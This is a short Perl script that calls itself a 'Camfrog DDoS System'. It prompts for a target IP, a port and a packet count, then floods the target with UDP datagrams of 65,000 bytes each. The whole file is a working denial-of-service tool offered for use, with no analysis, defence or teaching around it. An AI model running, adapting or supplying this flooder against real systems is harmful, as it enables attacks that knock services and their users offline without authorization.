#!/usr/bin/perl
use Socket;

print("Camfrog DDoS System By HackeRideR:\n\n");

print("Insert IP:");
my $ip = <STDIN>;
$ip =~ s/[\r\n]//g;

print("Insert Port:");
my $port = <STDIN>;
$port =~ s/[\r\n]//g;

print("Insert Paket:");
my $pack = <STDIN>;
$pack =~ s/[\r\n]//g;

print("Waiting DDoS..:");
if(udpflood($ip,$pack,$port))
{
	print(" DDoS TERMiNATE \n");
	system("pause");
}
else
{
	print(" Error! \n");
	system("pause");
}

sub udpflood{
  my $addr = inet_aton($_[0]);
  my $pack_n = $_[1];
  my $port = $_[2];
  my $udp_packet = 0;
  my $msg = 'A' x 65000;
  socket(SOCK, PF_INET, SOCK_DGRAM, 17) or return(undef);
  for($i = 0; $i < $pack_n; $i++)
  {
    send(SOCK, $msg, 0, sockaddr_in($port, $addr)) and $udp_packet++;
  }
  close(SOCK);
  return($udp_packet);
}
  
